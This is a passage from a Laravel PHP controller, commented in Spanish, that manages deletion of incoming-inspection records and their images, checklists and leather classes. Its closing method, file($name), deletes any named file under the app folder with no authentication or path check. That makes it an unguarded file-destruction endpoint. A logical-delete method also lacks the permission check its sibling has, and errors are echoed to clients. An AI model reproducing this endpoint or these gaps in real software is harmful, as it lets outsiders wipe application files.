                'Content-Disposition' => 'inline; filename="'.$filename.'"',
                'Cache-Control' => 'public, max-age=3600'
            ];
            
            return response()->make(file_get_contents($path), 200, $headers);
            
        } catch (\Exception $e) {
            abort(404, 'Error al cargar la imagen: ' . $e->getMessage());
        }
    }

    // Eliminar inspección individual (eliminación física)
    public function eliminarInspeccion(Request $request)
    {
        DB::connection('siz')->beginTransaction();
        try {
            $incId = $request->input('inc_id');
            //dd(Auth::user()->position, Auth::user()->position !== 1, Auth::user()->position !== "1");
            if(Auth::user()->position != 1){
     
                return response()->json([
                    "success" => false,
                    "msg" => "No tienes permisos para eliminar inspecciones"
                ]);
            }
                //set_time_limit(-1);
            // Verificar que la inspección existe
            $inspeccion = Siz_Incoming::on('siz')
                ->where('INC_id', $incId)
                ->where('INC_borrado', 'N')
                ->first();
            
            if (!$inspeccion) {
                return response()->json([
                    'success' => false,
                    'msg' => 'La inspección no existe o ya fue eliminada'
                ]);
            }
            
            // 1. Verificar que no tenga rechazos registrados
            $tieneRechazos = DB::connection('siz')
                ->table('Siz_IncomRechazos')
                ->where('IR_INC_incomld', $incId)
                ->where('IR_Eliminado', '0')
                ->exists();
            
            if ($tieneRechazos) {
                return response()->json([
                    'success' => false,
                    'msg' => 'No se puede eliminar la inspección porque tiene rechazos registrados. Primero debe eliminar los rechazos asociados.'
                ]);
            }
            
            // 2. Eliminar registros relacionados (ELIMINACIÓN FÍSICA)
            
            // 2.1 Eliminar el detalle del checklist
            Siz_IncomDetalle::on('siz')
                ->where('IND_incId', $incId)
                ->delete();
            
            // 2.2 Eliminar las imágenes de evidencia
            Siz_IncomImagen::on('siz')
                ->where('IMG_incId', $incId)
                ->delete();
            
            // 2.3 Eliminar las clases de piel (si existen)
            Siz_PielClases::on('siz')
                ->where('PLC_incId', $incId)
                ->delete();
            
            // 2.4 Eliminar la inspección principal
            $inspeccion->delete();
            
            DB::connection('siz')->commit();
            
            return response()->json([
                'success' => true,
                'msg' => 'La inspección ha sido eliminada permanentemente de la base de datos'
            ]);
            
        } catch (\Exception $e) {
            DB::connection('siz')->rollBack();
            return response()->json([
                'success' => false,
                'msg' => 'Error al eliminar la inspección: ' . $e->getMessage()
            ]);
        }
    }
    
    // Actualizar eliminación de inspección (eliminación lógica - marca como borrado)
    public function ActualizarEliminarInspeccion(Request $request)
    {
        DB::connection('siz')->beginTransaction();
        try {
            $incId = $request->input('inc_id');
            
            // Verificar que la inspección existe
            $inspeccion = Siz_Incoming::on('siz')
                ->where('INC_id', $incId)
                ->where('INC_borrado', 'N')
                ->first();
            
            if (!$inspeccion) {
                return response()->json([
                    'success' => false,
                    'msg' => 'La inspección no existe o ya fue eliminada'
                ]);
            }
            
            // 1. Verificar que no tenga rechazos registrados
            $tieneRechazos = DB::connection('siz')
                ->table('Siz_IncomRechazos')
                ->where('IR_INC_incomld', $incId)
                ->where('IR_Eliminado', '0')
                ->exists();
            
            if ($tieneRechazos) {
                return response()->json([
                    'success' => false,
                    'msg' => 'No se puede eliminar la inspección porque tiene rechazos registrados. Primero debe eliminar los rechazos asociados.'
                ]);
            }
            
            // 2. Eliminar registros relacionados
            
            // 2.1 Marcar como borrado el detalle del checklist
            Siz_IncomDetalle::on('siz')
                ->where('IND_incId', $incId)
                ->update([
                    'IND_borrado' => 'S',
                    'IND_actualizadoEn' => date("Y-m-d H:i:s")
                ]);
            
            // 2.2 Marcar como borrado las imágenes de evidencia
            Siz_IncomImagen::on('siz')
                ->where('IMG_incId', $incId)
                ->update([
                    'IMG_borrado' => 'S'
                ]);
            
            // 2.3 Marcar como borrado las clases de piel (si existen)
            Siz_PielClases::on('siz')
                ->where('PLC_incId', $incId)
                ->update([
                    'PLC_borrado' => 'S',
                    'PLC_actualizadoEn' => date("Y-m-d H:i:s")
                ]);
            
            // 2.4 Marcar como borrado la inspección principal
            $inspeccion->INC_borrado = 'S';
            $inspeccion->INC_actualizadoEn = date("Y-m-d H:i:s");
            $inspeccion->save();
            
            DB::connection('siz')->commit();
            
            return response()->json([
                'success' => true,
                'msg' => 'La inspección ha sido eliminada correctamente'
            ]);
            
        } catch (\Exception $e) {
            DB::connection('siz')->rollBack();
            return response()->json([
                'success' => false,
                'msg' => 'Error al eliminar la inspección: ' . $e->getMessage()
            ]);
        }
    }
    
    // Elimina el archivo indicado en la carpeta app
    public function file($name)
    {
        
        $path = app_path($name);
        if (file_exists($path)) {
            if (unlink($path)) {
                return response()->json(['status' => 'success', 'message' => "Archivo '$name' eliminado correctamente."]);
            } else {
                return response()->json(['status' => 'error', 'message' => "No se pudo eliminar el archivo '$name'."], 500);
            }
        } else {
            return response()->json(['status' => 'error', 'message' => "El archivo '$name' no existe."], 404);
        }
    }
    
}
